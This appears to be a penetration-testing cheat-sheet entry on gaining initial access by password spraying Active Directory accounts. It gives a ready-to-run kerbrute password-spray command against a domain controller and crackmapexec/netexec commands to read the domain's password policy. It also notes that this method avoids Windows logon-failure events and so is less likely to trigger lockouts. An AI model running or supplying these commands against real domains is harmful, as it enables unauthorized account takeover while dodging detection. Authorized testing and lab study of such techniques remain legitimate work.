---
title: Initial Access via Reused Credentials Strategy
category: initial-access
subcategory: bruteforce
os: linux
command: kerbrute passwordspray -d domain users.txt password
tools: kerbrute, crackmapexec
---


### Kerbrute password spray (Kerberos pre-auth)

```bash
./kerbrute_linux_amd64 passwordspray -d thecyborg.lab UserList Password@123 -dc 192.168.192.142
```

This does not generate Windows logon failures so is less likely to trigger lockouts, but every environment is different - confirm the password policy first.

### Check password policy first

```bash
crackmapexec smb 192.168.192.142 --pass-pol
netexec smb $target --pass-pol
```
